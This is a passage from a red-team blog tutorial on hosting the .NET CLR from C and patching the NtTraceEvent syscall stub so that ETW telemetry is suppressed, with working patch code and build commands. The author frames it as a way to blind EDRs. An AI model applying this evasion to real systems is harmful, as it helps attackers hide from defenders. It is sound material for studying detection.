+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Get last supported runtime
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRRuntimeInfo_GetInterface</span>(runtimeinfo, <span style="color:#f92672">&amp;</span>CLSID_CLRRuntimeHost, <span style="color:#f92672">&amp;</span>IID_ICLRRuntimeHost, (LPVOID<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>runtimehost);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] ICLRRuntimeInfo_GetInterface() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Check runtime host
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (count <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> NULL <span style="color:#f92672">==</span> runtimehost){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] No Valid Runtime Found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> OLEOBJ_S_INVALIDHWND;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If this is all good to go, we can then move onto the next step of the process, which is to actually start the <code>CLR</code>  into our current process.</p>
+<h3 id="startruntime" ><code>StartRuntime</code>
+<span>
+    <a href="#startruntime">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>This function is essentially a wrapper around the <code>ICLRRuntimeHost_Start</code> function, which is used to start the execution of the <code>CLR</code> in a process. It initializes the <code>CLR</code> and sets up the infrastructure needed for managed code execution. Once the <code>CLR</code> is started, it allows the process to load and execute assemblies that contain managed code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[i] Starting Runtime</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRRuntimeHost_Start</span>(runtimehost);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] ICLRRuntimeHost_Start() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This loads the <code>CLR</code> into our current process and at this point, we are good to run some managed code!</p>
+<h3 id="runassembly" ><code>RunAssembly</code>
+<span>
+    <a href="#runassembly">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>This is the part where we finally the run managed code with the <code>ICLRRuntimeHost_ExecuteInDefaultAppDomain</code> function. It takes in the path to the assembly, the name of the type in the format <code>Namespace.Class</code>, the name of the method to invoke, the string parameter to pass to the program and  variable to store the return code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRRuntimeHost_ExecuteInDefaultAppDomain</span>(runtimehost, assembly_path, namespace_class, function_name, cmd_arguments, <span style="color:#f92672">&amp;</span>res);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] ICLRRuntimeHost_ExecuteInDefaultAppDomain() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (result<span style="color:#f92672">==</span><span style="color:#ae81ff">0x80070002</span>){
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] The speicified .NET assembly could not be found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In our example, we invoke a very simple <code>MessageBox</code> program which displays the message we supplied as argument input as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">RunAssembly</span>(
+</span></span><span style="display:flex;"><span>PROGRAM_PATH,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;HelloWorld.Program&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;EntryPoint&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Hello There (General Kenobi)&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p><img src="/blogs/images/etw-patching-for-dummies/poc.png" alt=""></p>
+<h3 id="stopruntime" ><code>StopRuntime</code>
+<span>
+    <a href="#stopruntime">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Finally, we use stop the execution of the code with the <code>ICLRRuntimeHost_Stop</code> method call.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICLRRuntimeHost_Stop</span>(runtimehost);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (result <span style="color:#f92672">!=</span> S_OK){
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;[!] ICLRRuntimeHost_Stop() function failed (0x%x)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, result);\
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Finally, when everything is done, we call the <code>CleanUp</code> function and make sure we have released all the globals!</p>
+<hr>
+<p>One very interesting thing I noticed was if I open the process in <code>ProcessHacker</code>, right before the <code>CLR</code> runtime is started with the <code>ICLRRuntimeHost_Start()</code> function, the <code>.NET</code> tabs do not appear. However, as soon as the <code>CLR</code> host is up and running, the <code>.NET</code> tabs reappear again. <em>Interesting&hellip;&hellip;</em></p>
+<p><img src="/blogs/images/etw-patching-for-dummies/loader_under_process_hacker.png" alt="">
+One gaping problem in this project is that using this particular approach, we need the managed code to be run on the disk itself. A better way to do things would be to run things in-memory, but that&rsquo;s a problem for another time.</p>
+<h2 id="etw-what-the-hell-is-even-that" >ETW: What the hell is even that?
+<span>
+    <a href="#etw-what-the-hell-is-even-that">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>According to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-">MSDN docs</a>, <code>ETW</code> can be defined as:</p>
+<blockquote>
+<p><code>Event Tracing for Windows</code> (<code>ETW</code>) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. <code>ETW</code> is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features.</p>
+</blockquote>
+<p><code>ETW</code> has three components to it:</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers">Controllers</a>, which start and stop an event tracing session and enable providers</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers">Providers</a>, which provide the events</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers">Consumers</a>, which consume the events</li>
+</ul>
+<p>As red teamers, we are only concerned with the <code>Consumers</code> of <code>ETW</code>  log events. It is because often EDRs and AV engines act as consumer agents and analyze the events generated from various <code>Providers</code> to look for sus processes/events.</p>
+<p>One thing to keep in mind is that <code>ETW</code> is a kernel mode mechanism, unlike <code>AMSI</code> which dwells in userland. <code>ETW</code> consumers are now integrated into many EDR endpoint agents in order to receive <code>CLR</code> Runtime traces. Some of the providers which might reveal the secrets of your malicious <code>.NET</code> assemblies are:</p>
+<ul>
+<li>Microsoft-Windows-COMRuntime</li>
+<li>Microsoft-Windows-DotNETRuntime</li>
+<li>Microsoft-Windows-DotNETRuntimeRundown</li>
+</ul>
+<p>Infact, you can list all the providers on your system with:</p>
+<pre tabindex="0"><code>logman query providers
+</code></pre><p><img src="/blogs/images/etw-patching-for-dummies/listing_all_providers.png" alt=""></p>
+<p>Infact, we can write our own consumers, as you fill find <a href="https://github.com/whokilleddb/etw-patching-for-dummies">here</a> where you can monitor the logs generated by a process from a specific provider (there is a big list of providers in the <code>includes/providers.h</code> file so remember to swap out line <code>131</code> in <code>src/consumer.c</code> as I am too lazy to write a cli implementation just yet).</p>
+<p>Now the question is, how do we get around <code>ETW</code>? We cant let the defender know that red teamers are on the system, therefore, it&rsquo;s time to patch things up!</p>
+<h2 id="patching-etw" >Patching ETW
+<span>
+    <a href="#patching-etw">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>For the basics of ETW patching, I really recommend going through <a href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/">Adam Chester&rsquo;s Blog</a> which talks about patching the <a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite">EtwEventWrite</a> function. However, for our intents and purpose, we would be referring to this <a href="https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/">Whiteknight Blog</a> which goes one level deeper and patches the  <code>NtTraceEvent</code> syscall used by a lot of the logging utilities.</p>
+<p>The idea is to patch the <code>NtTraceEvent</code> function to return a value of 0 (<code>STATUS_SUCCESS</code>) indicates that the call was successful and the requested operation was completed. We overwrite the beginning of the function with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span>
+</span></span></code></pre></div><p>You can add a <code>nop</code> sled just for the ✨razzle-dazzle✨ but overall this should cause the intended value to be returned to the caller without actually issuing the syscall to the kernel, indicating to the caller that the syscall was successful. A quick and dirty skeletal code to patch <code>NtTraceEvent</code> can be written as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DWORD _temp, oldprotect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> patch_bytes[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xC3</span> };
+</span></span><span style="display:flex;"><span>FARPROC <span style="color:#960050;background-color:#1e0010"> </span>nt_trace_event_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetProcAddress</span>(<span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;ntdll&#34;</span>), <span style="color:#e6db74">&#34;NtTraceEvent&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">VirtualProtect</span>((LPVOID)nt_trace_event_addr, <span style="color:#66d9ef">sizeof</span>(patch_bytes), PAGE_EXECUTE_READWRITE, <span style="color:#f92672">&amp;</span>oldprotect);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(nt_trace_event_addr, patch_bytes, <span style="color:#66d9ef">sizeof</span>(patch_bytes));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">VirtualProtect</span>((LPVOID)nt_trace_event_addr, <span style="color:#66d9ef">sizeof</span>(patch_bytes), oldprotect, <span style="color:#f92672">&amp;</span>_temp);
+</span></span></code></pre></div><p>A small hiccup which I faced during the this while drawing a parallels with <code>AMSI</code> patching is that back during patching <code>AMSI</code>, I could set the memory protection with <code>VirtualProtect()</code> as <code>PAGE_READWRITE</code> but doing so here somehow crashes the program with the error code <code>0xC0000005</code> aka <code>STATUS_ACCESS_VIOLATION</code> which I believe is protected (afterall, its a syscall) and needs to be executable and readable!</p>
+<p>Apart from that we should be easily able to patch things up. The <code>patcher.c</code> program has a more refined version of the PoC code and once compiled, we can use <code>WinDbg</code> to see the syscall being patched in real time.</p>
+<p><img src="/blogs/images/etw-patching-for-dummies/patched_etw.png" alt=""></p>
+<p>Thus, we successfully patched ETW at a syscall level. ETW patching is just one of the many things you can do to blind EDRs. As a begineer, I wanted to understand how <code>C#</code>, <code>.NET</code> and <code>ETW</code> all come in together in thw Windows landscape, and how we as red teamers can be one step ahead at all times.</p>
+<h2 id="compilation" >Compilation
+<span>
+    <a href="#compilation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>To compile the sources, you can run the <code>compile.bat</code> script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; .\compile.bat
+</span></span></code></pre></div><p>Or, to compile them manually, run:</p>
+<ul>
+<li><strong>Consumer</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /I .\includes /Tc.\src\consumer.c /link /OUT<span style="color:#960050;background-color:#1e0010">:</span>consumer.exe /SUBSYSTEM<span style="color:#960050;background-color:#1e0010">:</span>CONSOLE /MACHINE<span style="color:#960050;background-color:#1e0010">:</span>x64
+</span></span></code></pre></div><ul>
+<li><strong>Patcher</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /I .\includes /Tc.\src\patcher.c /link /OUT<span style="color:#960050;background-color:#1e0010">:</span>patcher.exe /SUBSYSTEM<span style="color:#960050;background-color:#1e0010">:</span>CONSOLE /MACHINE<span style="color:#960050;background-color:#1e0010">:</span>x64
+</span></span></code></pre></div><h2 id="references" >References
+<span>
+    <a href="#references">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><ul>
+<li><a href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/">Hiding Your .NET – ETW</a></li>
+<li><a href="https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail/">Cobalt Strike 3.11 – The snake that eats its tail</a></li>
+<li><a href="https://mez0.cc/posts/common-language-runtime-1">Common Language Runtime #1: An Introduction</a></li>
+<li><a href="https://www.youtube.com/watch?v=3WJ1mRGP4So">Role of Common Language Runtime(CLR) in .NET Framework - .NET Technology Lectures</a></li>
+</ul>
+
+        </div>
+        
+
+    
+
+
+<div class="post-info">
+    
+        <div class="post-date dt-published">2023-01-25</div>
+    
+
+    <a class="post-hidden-url u-url" href="https://whokilleddb.github.io/blogs/posts/etw-patching-for-dummies/">https://whokilleddb.github.io/blogs/posts/etw-patching-for-dummies/</a>
+    <a href="https://whokilleddb.github.io/blogs/" class="p-name p-author post-hidden-author h-card" rel="me">whokilleddb</a>
+
+
+    <div class="post-taxonomies">
+        
+            
+    </div>
+</div>
+
+    </article>
+
+    
+        
+        
+    
+
+    
+        
+    <div class="pagination post-pagination">
+        <div class="left pagination-item disabled">
+            
+        </div>
+        <div class="right pagination-item ">
+            
+                <a href="/blogs/posts/thm_gallery/">TryHackMe: Gallery</a>
+            
+        </div>
+    </div>
+
+
+
+
+    
+
+    
+        
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "whokilleddb" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+
+
+
+
+
+    
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© whokilleddb, 2023<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
+            
+            </p>  
+        </div> 
+
+        
+
+    
+
+
+
+
+<script>
+const STORAGE_KEY = 'user-color-scheme'
+const defaultTheme = "dark-without-switcher"
+
+let currentTheme
+let switchButton
+let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')
+
+const autoChangeScheme = e => {
+    currentTheme = e.matches ? 'dark' : 'light'
+    document.documentElement.setAttribute('data-theme', currentTheme)
+    changeButtonText()
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    switchButton = document.querySelector('.theme-switcher')
+    currentTheme = detectCurrentScheme()
+    if (currentTheme == 'dark') {
+        document.documentElement.setAttribute('data-theme', 'dark')
+    }
+    if (currentTheme == 'auto') {
+        autoChangeScheme(autoDefinedScheme);
+        autoDefinedScheme.addListener(autoChangeScheme);
+    }
+
+    if (switchButton) {
+        changeButtonText()
+        switchButton.addEventListener('click', switchTheme, false)
+    }
+  
+    showContent()
+})
+
+function detectCurrentScheme() {
+    if (localStorage.getItem(STORAGE_KEY)) {
+        return localStorage.getItem(STORAGE_KEY)
+    } 
+    if (defaultTheme) {
+        return defaultTheme
+    } 
+    if (!window.matchMedia) {
+        return 'light'
+    } 
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        return 'dark'
+    }
+    return 'light'
+}
+
+function changeButtonText()
+{   
+    if (switchButton) {
+        switchButton.textContent = currentTheme == 'dark' ?  "Light theme" : "Dark theme"
+    }
+}
+
+function switchTheme(e) {
+    if (currentTheme == 'dark') {
+        localStorage.setItem(STORAGE_KEY, 'light')
+        document.documentElement.setAttribute('data-theme', 'light')
+        currentTheme = 'light'
+    } else {
+        localStorage.setItem(STORAGE_KEY, 'dark')
+        document.documentElement.setAttribute('data-theme', 'dark')
+        currentTheme = 'dark'
+    }
+    changeButtonText()
+}
+
+function showContent() {
+    document.body.style.visibility = 'visible';
+    document.body.style.opacity = 1;
+}
+</script>   
+    </div>
+
+    <p class="h-card vcard">
+
+    <a href=https://whokilleddb.github.io/blogs/ class="p-name u-url url fn" rel="me">whokilleddb</a> 
+
+     
+        /
+        <a class="p-email u-email email" rel="me" href="mailto:whokilleddb@protonmail.com">whokilleddb@protonmail.com</a>
+    
+
+     
+        <img class="u-photo" src="/images/avatar.png" />
+    
+</p> 
+</footer>
+
+        
+    </div>
+</body>
+</html>
